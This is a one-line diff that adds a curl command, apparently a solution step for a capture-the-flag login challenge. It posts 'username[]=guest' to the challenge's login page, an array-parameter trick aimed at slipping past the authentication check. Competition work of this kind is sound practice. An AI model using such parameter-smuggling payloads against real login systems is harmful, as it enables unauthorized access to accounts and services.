@@ -1,0 +1,1 @@
+curl http://login-web.chal.2024.ctf.acsc.asia:5000/login -X POST -d "username[]=guest&password=guest"
